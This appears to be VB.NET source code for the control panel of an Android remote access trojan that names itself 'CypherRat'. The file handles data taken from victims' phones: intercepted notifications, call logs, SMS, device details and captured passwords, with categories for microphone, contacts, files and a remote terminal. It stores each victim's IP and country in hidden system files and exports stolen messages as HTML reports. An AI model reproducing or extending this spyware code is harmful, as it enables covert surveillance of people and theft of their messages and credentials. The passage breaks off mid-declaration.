Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Runtime.InteropServices
Imports AngelAndroid_v2.sockets
Imports WinMM
Module SpySettings
    Public FLAGS_PERFORMANCE As String = My.Settings.performance
    Public LOCATION_NOTICETIGHT As String = My.Settings.location
    Public SOHW_ALERT As String = My.Settings.show_alert
    Public ENCODING8 As String = My.Settings.encoding8
    Public DISCONNECTED As String = My.Settings.disconnected
    Public AUTO_FOCUS As String = My.Settings.Auto_focus
    Public EFFECTS_CAM As String = My.Settings.Effects_CAM
    Public STYLE_MAPS As String = My.Settings.Style_Maps
    Public SAVING_DATA As String = My.Settings.Saving_data
    Public CAM_Quality As String = My.Settings.CAMQuality
    Public DefaultColor_Foreground As Color = Color.White
    Public DefaultColor_Background As Color = Color.FromArgb(40, 40, 40)
    Public DefaultColor_ColorTitles As Color = Color.Blue
    Public DefaultColor_NewColorFiles As Color = Color.Red
    Public NOTI_SOUND As Boolean = My.Settings.NOTI_SOUND
    Public FLAGS_Visible As String = My.Settings.Flags_Visible
    Public FLAGS_Size As String = My.Settings.Flags_Size
    Public NOTI_Round As String = My.Settings.Round
    Public SC_Status As String = My.Settings.SStatus_Visible
    Public FM_IC_Size As String = My.Settings.FM_IC_Size
    Public vRemoving_Duplicates = My.Settings.Removing_Duplicates
    Public ColumnsIndex As String = "0123456789"
    Public FormColorStyle As String = Decrypt("BGHMRR22j9x7NHRPT2Te9w==", "SelectedColor")
     Public Formstylefont As String = Decrypt("spreco+SzyGtTmZ1YBlmY6VNO6xhdzqTIlT3qSxquIU=", "123456789QAZWSXEDCRFVTGBYHNUJMIKOL")
    Public T_Interval As Integer = 1
End Module
Module clrSAVE
    Public po1 As Point = Nothing
    Public po2 As Point = Nothing
End Module
Module Notif_Sound
    Public multi As Boolean = False
    Public aMedia As System.Media.SoundPlayer
    Public Snds As New MultiSounds
    Public path_File As String = reso.res_Path & "\Audio\notification.wav"
    Public id As Integer = 0
End Module
Public Class MultiSounds
    Private Snds As New Dictionary(Of String, String)
    Private sndcnt As Integer = 0
    <DllImport("winmm.dll", EntryPoint:="mciSendStringW")>
    Private Shared Function mciSendStringW(<MarshalAs(UnmanagedType.LPTStr)> ByVal lpszCommand As String, <MarshalAs(UnmanagedType.LPWStr)> ByVal lpszReturnString As System.Text.StringBuilder, ByVal cchReturn As UInteger, ByVal hwndCallback As IntPtr) As Integer
    End Function
    Public Function AddSound(ByVal SoundName As String, ByVal SndFilePath As String) As Boolean
        If SoundName.Trim = "" Or Not IO.File.Exists(SndFilePath) Then Return False
        If mciSendStringW("open " & Chr(34) & SndFilePath & Chr(34) & " alias " & "Snd_" & sndcnt.ToString, Nothing, 0, IntPtr.Zero) <> 0 Then Return False
        Snds.Add(SoundName, "Snd_" & sndcnt.ToString)
        sndcnt += 1
        Return True
    End Function
    Public Function Play(ByVal SoundName As String) As Boolean
        If Not Snds.ContainsKey(SoundName) Then Return False
        mciSendStringW("seek " & Snds.Item(SoundName) & " to start", Nothing, 0, IntPtr.Zero)
        If mciSendStringW("play " & Snds.Item(SoundName), Nothing, 0, IntPtr.Zero) <> 0 Then Return False
        Return True
    End Function
End Class
 Module reso
     Public FontDrawString As Font = Nothing
     Public f As Font = Nothing
     Public ReadOnly MY_Path As String = Application.StartupPath & "\"
     Public ReadOnly res_Path As String = Application.StartupPath & "\res"
     Public ReadOnly domen As String = "plugens.angel.plugens"
     Public ReadOnly users As String = "Users"
     Public ReadOnly nameRAT As String = "CypherRat"
        Public maps As System.Text.StringBuilder
     Public plug As List(Of Object)
     Public SupportedText As String
     Public SupportedImages As String
     Public SupportedVideo As String
     Friend Sub FormatNotifi(tHEDATA As String, cli As Client)
        Try
            Dim arymsg As String() = tHEDATA.Split("|")
            Dim Appname As String = arymsg(0)
            Dim title As String = arymsg(1)
            Dim Text As String = arymsg(2) + arymsg(3)
            For index = 0 To cli.Notifications.Count - 1
                If cli.Notifications(index) Is Nothing Then
                    cli.Notifications(index) = vbNewLine + Appname + vbNewLine + title + vbNewLine + Text
                    Exit For
                End If
            Next
            cli.isnewnotifi = True
        Catch ex As Exception
         End Try
    End Sub
    Public Function FormatCALL(MSG As String) As String
        MSG = MSG.Replace("@", "")
        Dim arymsg As String() = MSG.Split("|")
         Dim CallTime As String = arymsg(2)
        Dim FinalMSG As String = "null"
         Select Case arymsg(0)
            Case "onn"
                 FinalMSG = "Call Received"
            Case "ens"
                 FinalMSG = "Call Answered"
            Case "ene"
                 FinalMSG = "Call Ended"
            Case "ogs"
                 FinalMSG = "Call Start"
            Case "oge"
                 FinalMSG = "Call Ended"
            Case "mc"
                 FinalMSG = "Missed Call"
        End Select
         Return FinalMSG + ">" + CallTime
     End Function
     Public Function ChekLink(lnk As String) As String
        If Not lnk.StartsWith("https://") AndAlso Not lnk.StartsWith("http://") Then
            Return "https://" & lnk
        Else
            Return lnk
        End If
    End Function
    Public Function CheckRegPolice(Typ As String) As String
          Dim regKey As Microsoft.Win32.RegistryKey
        Dim Value As Object
agin:
        Try
            regKey = My.Computer.Registry.CurrentUser.OpenSubKey("CypherRat\Policetouse", True)
             If Typ = "g" Then
                Value = regKey.GetValue("CypherRat")
                If Value = Nothing Then
                    Return Nothing
                Else
                    If Value = "OK" Then
                        Return Value
                    Else
                        Return Nothing
                    End If
                 End If
            Else
                regKey.SetValue("CypherRat", "OK")
             End If
            regKey.Close()
        Catch ex As Exception
            regKey = My.Computer.Registry.CurrentUser.CreateSubKey("CypherRat\Policetouse")
            GoTo agin
        End Try
     End Function
     Private Function GetFlag(ByVal ips As String) As String
        Dim flag As String = ""
        Dim bmp As Bitmap = Nothing
        If ips.Contains("-") Then
            Dim ip As String = ips.Split("-")(1).Trim
            bmp = GetFlagThisIp.ThisIp(ip)
            If bmp Is Nothing Then
                Return ""
            End If
            Dim IC As New ImageConverter()
            Dim byt As Byte() = IC.ConvertTo(bmp, GetType(Byte()))
            flag = "<img src=""data:Image/ png;base64," & Convert.ToBase64String(byt) & """ alt=""flag"" />"
            Return flag
        Else
            Return ""
        End If
    End Function
     Public Sub Directory_Exist(ByVal clas As sockets.Client)
         Dim classClient As sockets.Client = DirectCast(clas, sockets.Client)
         If Not classClient Is Nothing Then
             Dim down As String = classClient.FolderUSER
             If Not IO.Directory.Exists(down) Then
                 IO.Directory.CreateDirectory(down)
             End If
             Sys({down, classClient.ClientName, classClient.ClientAddressIP, classClient.Country})
         End If
     End Sub
     Public Function GetVersionClient(ByVal k As String()) As String
        Return "k"
    End Function
    Public Sub Sys(ByVal data As String())
        Try
            Dim path As String = data(0) & "\user.info"
            If IO.File.Exists(path) Then
                IO.File.SetAttributes(path, IO.FileAttributes.Normal)
            End If
            IO.File.WriteAllText(path, data(1) & vbNewLine & data(2) & vbNewLine & data(3))
            IO.File.SetAttributes(path, IO.FileAttributes.Hidden Or IO.FileAttributes.System)
        Catch ex As Exception
         End Try
    End Sub
     Friend Function formatPasses(tHEDATA As String) As Object
        Dim str As String() = tHEDATA.Split("<")
        Return New Object() {str(0), str(1), str(2)}
    End Function
     Public Sub SAVEit(ByVal ar As Array)
         Dim c1 As String = String.Format("{0}, {1}, {2}", DefaultColor_Foreground.R, DefaultColor_Foreground.G, DefaultColor_Foreground.B)
        Dim c0 As String = String.Format("{0}, {1}, {2}", DefaultColor_Background.R, DefaultColor_Background.G, DefaultColor_Background.B)
        Dim c2 As String = String.Format("{0}, {1}, {2}", DefaultColor_ColorTitles.R, DefaultColor_ColorTitles.G, DefaultColor_ColorTitles.B)
         Select Case DirectCast(ar.GetValue(6), String)
             Case "log"
                Dim head As String = "<!DOCTYPE html>
<html>
<head>
<style>
table, th, td {
  border: 1px solid rgb(" & c1 & ");
  border-collapse: collapse;
  text-align: left;
}
<style>
::-moz-selection {
  color: rgb(" & c0 & ");
  background-color: rgb(" & c1 & ");
}
::selection {
  color: rgb(" & c0 & ");
  background-color: rgb(" & c1 & ");
}
</style>
</head>
 <body style=""background: rgb(" & c0 & ");font-family:courier;"" >
<table style=""width:50%"">"
                 Dim name As String = DirectCast(ar.GetValue(3), String)
                 Dim cIP As String = DirectCast(ar.GetValue(4), String)
                 Dim nameLog As String = DirectCast(ar.GetValue(5), String)
                 Dim gr As String = "<h1 style=""color: rgb(" & c1 & ");"">" & name & "</h1>
<h2 style=""color: rgb(" & c1 & ");"">" & If(GetFlag(cIP) = "", "", GetFlag(cIP) & Space(1)) & cIP.Replace("-", "/ip:") & "</h2>
<p style=""color: rgb(" & c1 & ");"">" & nameLog & "</p>"
                 Dim ppp As String = ""
                 If ar.GetValue(1) = "null" Then
                     ppp = ar.GetValue(2)
                     GoTo PointSkip0
                 End If
                 Dim Path As String = DirectCast(ar.GetValue(1), String) & "\"
                 Dim nameFolder As String = DirectCast(ar.GetValue(2), String) & "\"
                 Dim nameFile As String = DirectCast(ar.GetValue(7), String)
                 If IO.Directory.Exists(Path) Then
                     If Not IO.Directory.Exists(Path & nameFolder) Then
                         IO.Directory.CreateDirectory(Path & nameFolder)
                     End If
                     ppp = Path & nameFolder & nameFile
                     If Not IO.File.Exists(ppp) Then
                         IO.File.Create(ppp).Close()
                     End If
                     If IO.File.Exists(ppp) Then
PointSkip0:
                         Using sw As IO.StreamWriter = New IO.StreamWriter(ppp, True, Codes.Encoding())
                             sw.Write(head & vbNewLine)
                             sw.Write(gr & vbNewLine)
                             sw.Write("<tr style=""color: rgb(" & c0 & "); background: rgb(" & c1 & ");"">" & vbNewLine)
                             Dim GridView As DataGridView = DirectCast(ar.GetValue(0), DataGridView)
                             For i As Integer = 0 To GridView.ColumnCount - 1
                                 If GridView.Columns(i).GetType.ToString.ToLower.Contains("DataGridViewTextBoxColumn".ToLower) Then
                                     sw.Write("<th>" & GridView.Columns(i).HeaderText & "</th>" & vbNewLine)
                                 End If
                             Next
                             For r As Integer = 0 To GridView.Rows.Count - 1
                                 sw.Write("</tr>" & vbNewLine)
                                 sw.Write("<tr style=""color: rgb(" & c1 & "); background: rgb(" & c0 & ");"">" & vbNewLine)
                                 For i As Integer = 0 To GridView.ColumnCount - 1
                                     If GridView.Columns(i).GetType.ToString.ToLower.Contains("DataGridViewTextBoxColumn".ToLower) Then
                                         sw.Write("<td>" & GridView.Rows(r).Cells(i).Value & "</td>" & vbNewLine)
                                     End If
                                 Next
                                 sw.Write("</tr>" & vbNewLine)
                             Next
                             sw.Write("</table>" & vbNewLine)
                             sw.Write("</body>" & vbNewLine)
                             sw.Write("</html>" & vbNewLine)
                             sw.Close()
                         End Using
                     End If
                 End If
            Case "sms"
                 Dim GridView As DataGridView = DirectCast(ar.GetValue(0), DataGridView)
                 Dim head As String = "<!DOCTYPE html>
<html>
<head>
<style>
table, th, td {
  border: 1px solid rgb(" & c1 & ");
  border-collapse: collapse;
  text-align: left;
}
<style>
::-moz-selection {
  color: rgb(" & c0 & ");
  background-color: rgb(" & c1 & ");
}
::selection {
  color: rgb(" & c0 & ");
  background-color: rgb(" & c1 & ");
}
</style>
</head>
 <body style=""background: rgb(" & c0 & ");font-family:courier;"" >
<table style=""width:50%"">"
                 Dim name As String = DirectCast(ar.GetValue(3), String)
                 Dim cIP As String = DirectCast(ar.GetValue(4), String)
                 Dim ptSMS As String = String.Empty
                 If GridView.Rows.Count > 0 Then
                    ptSMS = GridView.Rows(0).Cells(4).Value
                End If
                 Dim nameLog As String = DirectCast(ar.GetValue(5), String) & Space(1) & ptSMS
                 Dim gr As String = "<h1 style=""color: rgb(" & c1 & ");"">" & name & "</h1>
<h2 style=""color: rgb(" & c1 & ");"">" & If(GetFlag(cIP) = "", "", GetFlag(cIP) & Space(1)) & cIP.Replace("-", "/ip:") & "</h2>
<p style=""color: rgb(" & c1 & ");"">" & nameLog & "</p>"
                 Dim ppp As String = ""
                 If ar.GetValue(1) = "null" Then
                     ppp = ar.GetValue(2)
                     GoTo PointSkip1
                 End If
                 Dim Path As String = DirectCast(ar.GetValue(1), String) & "\"
                 Dim nameFolder As String = DirectCast(ar.GetValue(2), String) & "\"
                 Dim nameFile As String = DirectCast(ar.GetValue(7), String)
                 If IO.Directory.Exists(Path) Then
                     If Not IO.Directory.Exists(Path & nameFolder) Then
                         IO.Directory.CreateDirectory(Path & nameFolder)
                     End If
                     ppp = Path & nameFolder & nameFile
                     If Not IO.File.Exists(ppp) Then
                         IO.File.Create(ppp).Close()
                     End If
                     If IO.File.Exists(ppp) Then
PointSkip1:
                         Using sw As IO.StreamWriter = New IO.StreamWriter(ppp, True, Codes.Encoding())
                             sw.Write(head & vbNewLine)
                             sw.Write(gr & vbNewLine)
                             sw.Write("<style>
div {border: 2px solid gray;padding: 10px;color: rgb(" & c1 & ");
 border-color: rgb(" & c1 & ")
}
<p style=""color: rgb(" & c1 & ");"">
</style>" & vbNewLine)
                             Dim col0 As String = GridView.Columns(0).HeaderText
                             Dim col1 As String = GridView.Columns(1).HeaderText
                             Dim col2 As String = GridView.Columns(2).HeaderText
                             For r As Integer = 0 To GridView.Rows.Count - 1
                                 sw.Write("<div>" & vbNewLine)
                                 sw.Write("<p>" & col0 & ":" & GridView.Rows(r).Cells(0).Value & "</p>" & vbNewLine)
                                 sw.Write("<p>" & col1 & ":" & GridView.Rows(r).Cells(1).Value & "</p>" & vbNewLine)
                                 sw.Write("<p>" & col2 & ":" & GridView.Rows(r).Cells(2).Value & "</p>" & vbNewLine)
                                 sw.Write("<p>" & GridView.Rows(r).Tag & "</p>" & vbNewLine)
                                 sw.Write("</div>" & vbNewLine)
                             Next
                             sw.Write("</body>" & vbNewLine)
                             sw.Write("</html>" & vbNewLine)
                             sw.Close()
                         End Using
                     End If
                 End If
            Case "info"
                Dim head As String = "<!DOCTYPE html>
<html>
<head>
<style>
table, th, td {
  border: 1px solid rgb(" & c1 & ");
  border-collapse: collapse;
  text-align: left;
}
  tr.noBorder td {
  border: 0;
}
<style>
::-moz-selection {
  color: rgb(" & c0 & ");
  background-color: rgb(" & c1 & ");
}
::selection {
  color: rgb(" & c0 & ");
  background-color: rgb(" & c1 & ");
}
</style>
</head>
 <body style=""background: rgb(" & c0 & ");font-family:courier;"" >
<table style=""width:50%"">"
                 Dim name As String = DirectCast(ar.GetValue(3), String)
                 Dim cIP As String = DirectCast(ar.GetValue(4), String)
                 Dim nameLog As String = DirectCast(ar.GetValue(5), String)
                 Dim gr As String = "<h1 style=""color: rgb(" & c1 & ");"">" & name & "</h1>
<h2 style=""color: rgb(" & c1 & ");"">" & If(GetFlag(cIP) = "", "", GetFlag(cIP) & Space(1)) & cIP.Replace("-", "/ip:") & "</h2>
<p style=""color: rgb(" & c1 & ");"">" & nameLog & "</p>"
                 Dim ppp As String = ""
                 If ar.GetValue(1) = "null" Then
                     ppp = ar.GetValue(2)
                     GoTo PointSkip2
                 End If
                 Dim Path As String = DirectCast(ar.GetValue(1), String) & "\"
                 Dim nameFolder As String = DirectCast(ar.GetValue(2), String) & "\"
                 Dim nameFile As String = DirectCast(ar.GetValue(7), String)
                 If IO.Directory.Exists(Path) Then
                     If Not IO.Directory.Exists(Path & nameFolder) Then
                         IO.Directory.CreateDirectory(Path & nameFolder)
                     End If
                     ppp = Path & nameFolder & nameFile
                     If Not IO.File.Exists(ppp) Then
                         IO.File.Create(ppp).Close()
                     End If
                     If IO.File.Exists(ppp) Then
PointSkip2:
                         Using sw As IO.StreamWriter = New IO.StreamWriter(ppp, True, Codes.Encoding())
                             sw.Write(head & vbNewLine)
                             sw.Write(gr & vbNewLine)
                             sw.Write("<tr style=""color: rgb(" & c0 & "); background: rgb(" & c1 & ");"">" & vbNewLine)
                             Dim ds As DataSet = DirectCast(ar.GetValue(0), DataSet)
                             Dim tb As DataTable = ds.Tables(0)
                             sw.Write("<th>" & tb.Columns(0).ColumnName & "</th>" & vbNewLine)
                             sw.Write("<th>" & tb.Columns(1).ColumnName & "</th>" & vbNewLine)
                             For Each ro In tb.Rows
                                 sw.Write("</tr>" & vbNewLine)
                                 If ro.Item(1) = "sub" Then
                                     sw.Write("<tr Class=""noBorder""; style=""color: rgb(" & c2 & "); background: rgb(" & c0 & ");"">" & vbNewLine)
                                     sw.Write("<td>" & ro.Item(0) & "</td>" & vbNewLine)
                                     sw.Write("<td>" & String.Empty & "</td>" & vbNewLine)
                                     sw.Write("</tr>" & vbNewLine)
                                 Else
                                     sw.Write("<tr style=""color: rgb(" & c1 & "); background: rgb(" & c0 & ");"">" & vbNewLine)
                                     sw.Write("<td>" & ro.Item(0) & "</td>" & vbNewLine)
                                     sw.Write("<td>" & ro.Item(1) & "</td>" & vbNewLine)
                                     sw.Write("</tr>" & vbNewLine)
                                End If
                             Next
                             sw.Write("</table>" & vbNewLine)
                             sw.Write("</body>" & vbNewLine)
                             sw.Write("</html>" & vbNewLine)
                             sw.Close()
                         End Using
                     End If
                 End If
         End Select
     End Sub
    Public Sub UPDATEKEY(ByVal key As String, Col As Collection, obj As Object())
        Col.Remove(key)
        Col.Add(obj, key, Nothing, Nothing)
    End Sub
    Public Function GETKEY(ByVal key As String, Col As Collection)
        Try
            Return Col.Item(key)
        Catch ex As Exception
            Return Nothing
        End Try
     End Function
    Public Function BytesConverter(ByVal bytes As Long) As String
        Dim KB As Long = 1024
        Dim MB As Long = KB * KB
        Dim GB As Long = KB * KB * KB
        Dim TB As Long = KB * KB * KB * KB
        Dim returnVal As String = "0 Bytes"
        Select Case bytes
            Case Is < KB
                returnVal = bytes & " Bytes"
            Case Is > TB
                returnVal = (bytes / KB / KB / KB / KB).ToString("0.00") & " TB"
            Case Is > GB
                returnVal = (bytes / KB / KB / KB).ToString("0.00") & " GB"
            Case Is > MB
                returnVal = (bytes / KB / KB).ToString("0.00") & " MB"
            Case Is >= KB
                returnVal = (bytes / KB).ToString("0.00") & " KB"
        End Select
        Return returnVal.ToString
    End Function
    Public Function Between(ByVal v0 As String, ByVal v1 As String) As String
        Try
            Return System.Text.RegularExpressions.Regex.Match(maps.ToString, "(?<=" & System.Text.RegularExpressions.Regex.Escape(v0) & ").+?(?=" & System.Text.RegularExpressions.Regex.Escape(v1) & ")", System.Text.RegularExpressions.RegexOptions.IgnoreCase).Value
        Catch ex As Exception
            Return "-1"
        End Try
    End Function
     Public Function FormatWave(ByVal v As Integer) As WaveFormat
        Select Case v
            Case 8000
                Return WaveFormat.Pcm8Khz16BitMono
            Case 11025
                Return WaveFormat.Pcm11Khz16BitMono
            Case 16000
                Return WaveFormat.Pcm16Khz16BitMono
            Case 22050
                Return WaveFormat.Pcm22Khz16BitMono
            Case 32000
                Return WaveFormat.Pcm32Khz16BitMono
            Case 44100
                Return WaveFormat.Pcm44Khz16BitMono
        End Select
        Return WaveFormat.Pcm8Khz16BitMono
    End Function
    Public Function HzString(ByVal v As Integer) As String
        Select Case v
            Case 8000
                Return "8000 (Hz)"
            Case 11025
                Return "11025 (Hz)"
            Case 16000
                Return "16000 (Hz)"
            Case 22050
                Return "22050 (Hz)"
            Case 32000
                Return "32000 (Hz)"
            Case 44100
                Return "44100 (Hz)"
        End Select
        Return "null"
    End Function
    Public Function HzInt(ByVal v As String) As Integer
        Select Case v
            Case "8000 (Hz)"
                Return 8000
            Case "11025 (Hz)"
                Return 11025
            Case "16000 (Hz)"
                Return 16000
            Case "22050 (Hz)"
                Return 22050
            Case "32000 (Hz)"
                Return 32000
            Case "44100 (Hz)"
                Return 44100
        End Select
        Return 8000
    End Function
    Public Function Maps_style() As String
        Return SpySettings.STYLE_MAPS
    End Function
     Public Sub SetBattery(ClassClient As Client)
        Select Case CInt(ClassClient.BatteryCharge.Replace("f", ""))
            Case <= 25
                ClassClient.Battery = My.Resources.low
             Case <= 50
                ClassClient.Battery = My.Resources.min
             Case <= 80
                ClassClient.Battery = My.Resources.Abov_mid
            Case Else
                ClassClient.Battery = My.Resources.full
        End Select
     End Sub
    Public Function Generals(ByVal num As String) As String
        Select Case num
            Case "gen-1"
                Return "apps"
            Case "gen-2"
                Return "calls"
            Case "gen-3"
                Return "contacts"
            Case "gen-4"
                Return "files"
            Case "gen-5"
                Return "info"
            Case "gen-6"
                Return "microphone"
            Case "gen-7"
                Return "sms"
            Case "gen-8"
                Return "terminal"
            Case Else
                End
        End Select
    End Function
     Public Sub NewIcon(ByVal icon As String, ByVal path As String)
        Dim Def As String = "DefaultIcon"
        Try
            Dim rk As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.ClassesRoot.OpenSubKey(String.Format("{0}\{1}", path, Def), True)
            If rk Is Nothing Then
                Microsoft.Win32.Registry.ClassesRoot.CreateSubKey(String.Format("{0}\{1}", path, Def)).SetValue("", icon)
                RefreshExplorer.EnvRefresh()
            Else
                If Not IO.File.Exists(rk.GetValue("")) Then
                    rk.SetValue("", icon)
                    RefreshExplorer.EnvRefresh()
                End If
            End If
        Catch UAE As System.UnauthorizedAccessException
        End Try
     End Sub
     Public Sub SetScreen(ByVal v As String, ByVal C As Client)
        Select Case v.Trim
            Case "0"
                C.Screen = My.Resources.ON_LOCK
             Case "1"
                C.Screen = My.Resources.OFF_LOCK
             Case "2"
                C.Screen = My.Resources._on
             Case "3"
                C.Screen = My.Resources.OFF
         End Select
     End Sub
     Public Function ChangeOpacity(img As Image)
        Dim bmp2 As New Bitmap(img.Width, img.Height)
        Dim rect As New Rectangle(0, 0, bmp2.Width, bmp2.Height)
        Dim cm As New ColorMatrix(New Single()() _
                    {New Single() {1, 0, 0, 0, 0},
                     New Single() {0, 1, 0, 0, 0},
                     New Single() {0, 0, 1, 0, 0},
                     New Single() {0, 0, 0, 0.7, 0},
                     New Single() {0, 0, 0, 0, 0}})
         Dim ia As New ImageAttributes
        ia.SetColorMatrix(cm)
         Using g As Graphics = Graphics.FromImage(bmp2)
              g.DrawImage(img, rect, 0, 0, img.Width, img.Height, GraphicsUnit.Pixel, ia)
             Return bmp2
        End Using
    End Function
    Private Function FormatImg(ByVal s As String, ByVal Client As Client) As Bitmap
          Dim m As New IO.MemoryStream(Convert.FromBase64String(s))
        Dim b As New Bitmap(Image.FromStream(m))
         m.Dispose()
        Return (New Bitmap(CropToCircle(b)))
     End Function
     Public Function DrawNumber(ByVal img As Image, ByVal txt As String)
         Using g = Graphics.FromImage(img)
            g.SmoothingMode = SmoothingMode.HighQuality
            g.DrawString(txt, reso.f, Brushes.Black, New PointF(10, 10))
        End Using
           Return img
    End Function
    Public Function CropToCircle(ByVal srcImage As Image) As Image
         Dim originalImage = srcImage
          Dim croppedImage As New Bitmap(originalImage.Width, originalImage.Height)
          Using g = Graphics.FromImage(croppedImage)
            Dim path As New GraphicsPath
            g.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
             path.AddEllipse(0, 0, croppedImage.Width, croppedImage.Height)
             Dim reg As New Region(path)
              g.Clip = reg
            g.DrawImage(originalImage, Point.Empty)
        End Using
        Return croppedImage
    End Function
     Public Function Wallpaper(ByVal v As String, ByVal xx As Integer, ByVal yy As Integer, ByVal Client As Client) As Bitmap
        Dim t As String = My.Resources.wallpaper.ToString.Trim
        If Not v = "-1" Or v = "" Then
            Dim c() As Byte = Convert.FromBase64String(v)
            Dim m As New IO.MemoryStream(c)
            Dim h As New Bitmap(Image.FromStream(m))
            Dim w As Integer = h.Size.Width
            Dim s As Integer = h.Size.Height
            If w = xx And s = yy Then
                t = v
            End If
            m.Dispose()
        End If
        Return FormatImg(t, Client)
    End Function
     Public Const IconsSize As Integer = 48
    Public Function GetEllImage(ByVal sel As Integer, ByVal parm As Object()) As Image
        Select Case sel
            Case 0
                Dim clr As Color = Color.FromArgb(170, SpySettings.DefaultColor_Background.R, SpySettings.DefaultColor_Background.G, SpySettings.DefaultColor_Background.B)
                Dim p As New Pen(clr, 2)
                Using bm As New Bitmap(IconsSize, IconsSize)
                    Using grx8 As Graphics = Graphics.FromImage(bm)
                        grx8.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
                        Using tb As New TextureBrush(bm)
                            tb.TranslateTransform(0, 0)
                            Using gp As New Drawing2D.GraphicsPath
                                Using br As New SolidBrush(getClr())
                                    grx8.FillEllipse(br, 4, 4, bm.Width - 12, bm.Height - 12)
                                End Using
                                grx8.DrawEllipse(p, 4, 4, bm.Width - 12, bm.Height - 12)
                            End Using
                        End Using
                        Dim b As Image = New Bitmap(parm(0).ToString)
                        grx8.DrawImage(RECOLOR(b, Color.FromArgb(190, 190, 190), clr), CInt(parm(1)), CInt(parm(2)), CInt(parm(3)), CInt(parm(4)))
                    End Using
                    Return New Bitmap(bm)
                End Using
            Case 1
                Dim clr As Color = Color.FromArgb(170, SpySettings.DefaultColor_Background.R, SpySettings.DefaultColor_Background.G, SpySettings.DefaultColor_Background.B)
                Dim p As New Pen(clr, 2)
                Using bm As New Bitmap(IconsSize, IconsSize)
                    Using grx8 As Graphics = Graphics.FromImage(bm)
                        grx8.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
                        Using tb As New TextureBrush(bm)
                            tb.TranslateTransform(0, 0)
                            Using gp As New Drawing2D.GraphicsPath
                                Using br As New SolidBrush(getClr())
                                    grx8.FillEllipse(br, 4, 4, bm.Width - 12, bm.Height - 12)
                                End Using
                                grx8.DrawEllipse(p, 4, 4, bm.Width - 12, bm.Height - 12)
                            End Using
                        End Using
                        Dim name As String = parm(0).ToString
                        If name = "null" And Not parm(2) = Nothing Then
                            name = parm(1).ToString
                        End If
                        Dim charx As String = Space(1)
                        If name.Trim.Length > 0 Then
                            charx = CStr(name.Chars(0))
                        End If
                        Dim textArea As Rectangle = New Rectangle(6, 6, bm.Width - 15, bm.Height - 15)
                        Dim textFormat As StringFormat = New StringFormat
                        textFormat.LineAlignment = StringAlignment.Center
                        textFormat.Alignment = StringAlignment.Center
                         grx8.DrawString(charx, reso.FontDrawString, New SolidBrush(clr), textArea, textFormat)
                    End Using
                    Return New Bitmap(bm)
                End Using
        End Select
        Return Nothing
    End Function
     Private Function getClr() As Color
        Return SpySettings.DefaultColor_Foreground
    End Function
    Public Function RECOLOR(image As Image, baseColor As Color, newColor As Color) As Bitmap
        Dim transformation As New Imaging.ColorMatrix(New Single()() {
        New Single() {1, 0, 0, 0, 0},
        New Single() {0, 1, 0, 0, 0},
        New Single() {0, 0, 1, 0, 0},
        New Single() {0, 0, 0, 1, 0},
        New Single() {(CInt(newColor.R) - CInt(baseColor.R)) / 255.0!, (CInt(newColor.G) - CInt(baseColor.G)) / 255.0!, (CInt(newColor.B) - CInt(baseColor.B)) / 255.0!, 0, 1}
    })
        Dim imageAttributes As New Imaging.ImageAttributes()
        imageAttributes.SetColorMatrix(transformation)
        Dim result As New Bitmap(image.Width, image.Height)
        Using g As Graphics = Graphics.FromImage(result)
            g.DrawImage(image, New Rectangle(0, 0, image.Width, image.Height), 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, imageAttributes)
        End Using
        Return result
    End Function
End Module
 Module CustomFont
    Private privateFonts As System.Drawing.Text.PrivateFontCollection = Nothing
    Public ReadOnly Property LoadFont(ByVal name As String, ByVal size As Integer, ByVal style As FontStyle) As System.Drawing.Font
        Get
            privateFonts = New System.Drawing.Text.PrivateFontCollection()
            privateFonts.AddFontFile(res_Path & "\Fonts\" & name)
            Dim Hack As System.Drawing.Font = New System.Drawing.Font(privateFonts.Families(0), size, style)
            Return Hack
        End Get
    End Property
End Module
Module CustomFontDrawString
    Private privateFonts As System.Drawing.Text.PrivateFontCollection = Nothing
    Public ReadOnly Property LoadFont(ByVal name As String, ByVal size As Integer, ByVal style As FontStyle) As System.Drawing.Font
        Get
            privateFonts = New System.Drawing.Text.PrivateFontCollection()
            privateFonts.AddFontFile(res_Path & "\Fonts\" & name)
            Dim Hack As System.Drawing.Font = New System.Drawing.Font(privateFonts.Families(0), size, style)
            Return Hack
        End Get
    End Property
End Module
 Module RefreshExplorer
    <DllImport("shell32.dll")>
    Sub SHChangeNotify(
    ByVal wEventID As HChangeNotifyEventID,
    ByVal uFlags As HChangeNotifyFlags,
    ByVal dwItem1 As IntPtr,
    ByVal dwItem2 As IntPtr)
    End Sub
    <Flags()>
    Public Enum HChangeNotifyFlags
        SHCNF_DWORD = &H3
        SHCNF_IDLIST = &H0
        SHCNF_PATHA = &H1
        SHCNF_PATHW = &H5
        SHCNF_PRINTERA = &H2
        SHCNF_PRINTERW = &H6
        SHCNF_FLUSH = &H1000
        SHCNF_FLUSHNOWAIT = &H2000
    End Enum
    <Flags()>
    Public Enum HChangeNotifyEventID
        SHCNE_ALLEVENTS = &H7FFFFFFF
        SHCNE_ASSOCCHANGED = &H8000000
        SHCNE_ATTRIBUTES = &H800
        SHCNE_CREATE = &H2
        SHCNE_DELETE = &H4
        SHCNE_DRIVEADD = &H10
        SHCNE_DRIVEADDGUI = &H10000
        SHCNE_DRIVEREMOVED = &H80
        SHCNE_EXTENDED_EVENT = &H4000000
        SHCNE_FREESPACE = &H40000
        SHCNE_MEDIAINSERTED = &H20
        SHCNE_MEDIAREMOVED = &H40
        SHCNE_MKDIR = &H8
        SHCNE_NETSHARE = &H200
        SHCNE_NETUNSHARE = &H400
        SHCNE_RENAMEFOLDER = &H20000
        SHCNE_RENAMEITEM = &H1
        SHCNE_RMDIR = &H10
        SHCNE_SERVERDISCONNECT = &H4000
        SHCNE_UPDATEDIR = &H1000
        SHCNE_UPDATEIMAGE = &H8000
    End Enum
    Public Sub EnvRefresh()
        SHChangeNotify(HChangeNotifyEventID.SHCNE_ASSOCCHANGED, HChangeNotifyFlags.SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero)
    End Sub
End Module
Module getIconFrmReg
    Private Const MAX_PATH As Int32 = 260
    Private Const SHGFI_ICON As Int32 = &H100
    Private Const SHGFI_USEFILEATTRIBUTES As Int32 = &H10
    Private Const FILE_ATTRIBUTE_NORMAL As Int32 = &H80
    Private Structure SHFILEINFO
